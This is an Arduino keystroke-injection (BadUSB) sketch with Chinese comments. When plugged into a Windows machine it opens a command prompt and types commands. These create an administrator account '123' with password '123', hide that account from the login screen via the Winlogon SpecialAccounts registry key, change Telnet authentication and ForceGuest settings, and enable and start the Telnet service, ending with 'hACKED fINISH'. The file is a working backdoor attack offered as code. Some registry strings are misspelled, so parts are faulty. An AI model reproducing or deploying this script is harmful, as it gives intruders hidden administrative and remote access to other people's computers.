void setup() {
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("CMD");
  Keyboard.println();
  delay(500);
  Keyboard.println("COLOR A&&CLS");
  Keyboard.println("NET USER 123 123 /ADD");
  delay(500);
  Keyboard.println("NET LOCALGROUP ADMINISTRATORS 123 /ADD&&REG ADD \"hkey_local_machine\\software\\mICROSOFT\\wINDOWS nt\\cURRENTvERSION\\wINLOGON\\sPECIALaCCOUNTS\\uSERlIST\" /V 123 /D 0 /T reg_dword /F&&REG ADD \"hkey_local_machine\\software\\microsoft\\tELNETsERVER\\1.0\" /V ntlm /D 0 /T reg_doword/f&&reg add \"hklm\\system\\cURRENTcONTROLsET\\cONTRAL\\lSA\" /V \"FORCEGUEST\" /T reg_dword /D 0 /F");
  delay(1000);
  Keyboard.println("SC CONFIG TLNTSVR START= AUTO");
  delay(500);
  Keyboard.println("NET START TELNET");
  delay(500);
  Keyboard.println("CLS&&ECHO hACKED fINISH");
    Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();
}
void loop() {
}
